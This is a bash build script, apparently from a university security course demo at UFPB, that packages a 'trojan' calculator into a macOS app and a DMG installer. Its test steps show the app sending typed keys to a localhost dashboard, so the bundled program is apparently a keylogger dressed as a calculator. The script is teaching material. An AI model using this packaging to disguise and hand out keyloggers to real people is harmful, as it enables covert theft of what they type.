#!/bin/bash
# =============================================================
#  DEMO EDUCACIONAL - Seguranca Computacional - UFPB
#  Gera o .app e .dmg da calculadora trojan
# =============================================================

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
cd "$PROJECT_DIR"

echo "================================================"
echo "  Gerando Calculadora.app (Trojan Demo) - UFPB"
echo "================================================"
echo ""

source venv/bin/activate

echo "[1/3] Gerando .app com PyInstaller..."
echo ""

pyinstaller \
    --onefile \
    --windowed \
    --name "Calculadora" \
    --osx-bundle-identifier "com.ufpb.calculadora.demo" \
    trojan/calculadora.py

echo ""
echo "[2/3] Gerando .dmg..."
echo ""

# Cria uma pasta temporaria pro DMG
DMG_DIR="$PROJECT_DIR/dist/dmg_contents"
rm -rf "$DMG_DIR"
mkdir -p "$DMG_DIR"

# Copia o .app
cp -R "$PROJECT_DIR/dist/Calculadora.app" "$DMG_DIR/"

# Cria link simbolico pro Applications (classico de DMG)
ln -s /Applications "$DMG_DIR/Applications"

# Gera o .dmg
DMG_OUTPUT="$PROJECT_DIR/dist/Calculadora-UFPB-Demo.dmg"
rm -f "$DMG_OUTPUT"

hdiutil create \
    -volname "Calculadora UFPB" \
    -srcfolder "$DMG_DIR" \
    -ov \
    -format UDZO \
    "$DMG_OUTPUT"

# Limpa
rm -rf "$DMG_DIR"

echo ""
echo "================================================"
echo "  PRONTO!"
echo ""
echo "  .app: dist/Calculadora.app"
echo "  .dmg: dist/Calculadora-UFPB-Demo.dmg"
echo ""
echo "  Para testar:"
echo "  1. Inicie o servidor: python server/app.py"
echo "  2. Abra o dashboard: http://localhost:8080"
echo "  3. Abra o .dmg e rode a Calculadora"
echo "  4. Veja as teclas no dashboard!"
echo "================================================"
